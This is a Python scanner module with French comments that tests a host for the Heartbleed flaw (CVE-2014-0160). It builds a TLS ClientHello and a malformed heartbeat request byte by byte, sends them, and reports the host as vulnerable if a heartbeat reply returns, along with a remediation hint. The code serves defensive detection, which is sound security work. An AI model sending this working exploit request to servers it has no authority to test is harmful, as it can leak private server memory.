from __future__ import annotations

import socket
from typing import Dict, Any


class TestHeartbleed:

    def __init__(self, fqdn: str, port: int, ip: str):
        self.fqdn = fqdn
        self.port = port
        self.ip = ip
        self.timeout = 10

    def lancer(self) -> Dict[str, Any]:
        vulnerable = False

        try:
            # TLS 1.1 ClientHello avec extension Heartbeat
            client_hello = bytearray([
                0x16, 0x03, 0x01, 0x00, 0x34,        # TLS record: Handshake, TLS 1.0, length 52
                0x01, 0x00, 0x00, 0x30,              # ClientHello, length 48
                0x03, 0x02,                          # Version: TLS 1.1
                # Random (32 bytes)
                0x52, 0x35, 0x6c, 0x67, 0x6e, 0x73, 0x71, 0x67,
                0x6b, 0x69, 0x64, 0x68, 0x6f, 0x63, 0x6e, 0x79,
                0x68, 0x68, 0x70, 0x77, 0x6f, 0x62, 0x79, 0x75,
                0x72, 0x77, 0x66, 0x6e, 0x63, 0x68, 0x74, 0x6d,
                0x00,                                # Session ID length: 0
                0x00, 0x02, 0x00, 0x2f,              # 1 cipher: TLS_RSA_WITH_AES_128_CBC_SHA
                0x01, 0x00,                          # 1 compression: null
                0x00, 0x05,                          # Extensions length: 5
                0x00, 0x0f, 0x00, 0x01, 0x01         # Heartbeat extension: peer allowed to send
            ])

            # Heartbeat malformé : payload_length=16384 mais payload réel vide
            heartbeat = bytearray([
                0x18,              # Content type: Heartbeat
                0x03, 0x02,        # Version: TLS 1.1
                0x00, 0x03,        # Record length: 3
                0x01,              # Type: Request
                0x40, 0x00         # Payload length: 16384 (beaucoup plus que le payload réel)
            ])

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.fqdn, self.port))

            sock.send(bytes(client_hello))

            # Lire la réponse du serveur (ServerHello etc.)
            data = b''
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                    if b'\x0e\x00\x00\x00' in data:  # ServerHelloDone
                        break
                except socket.timeout:
                    break

            sock.send(bytes(heartbeat))

            response = b''
            try:
                response = sock.recv(4096)
            except socket.timeout:
                pass

            sock.close()

            # Content type 0x18 = Heartbeat response → vulnérable
            vulnerable = len(response) > 0 and response[0] == 0x18

        except Exception:
            vulnerable = False

        return {
            'nom': 'Heartbleed',
            'cve': 'CVE-2014-0160',
            'vulnerable': vulnerable,
            'severite': 'CRITIQUE' if vulnerable else 'PAS VULNÉRABLE',
            'description': "Fuite mémoire via l'extension Heartbeat de OpenSSL",
            'recommandation': 'Mettre à jour OpenSSL vers une version >= 1.0.1g' if vulnerable else 'Serveur non vulnérable à Heartbleed',
            'details': 'Le serveur répond aux heartbeats malformées - fuite mémoire possible' if vulnerable else 'Aucune réponse aux heartbeats malformées'
        }
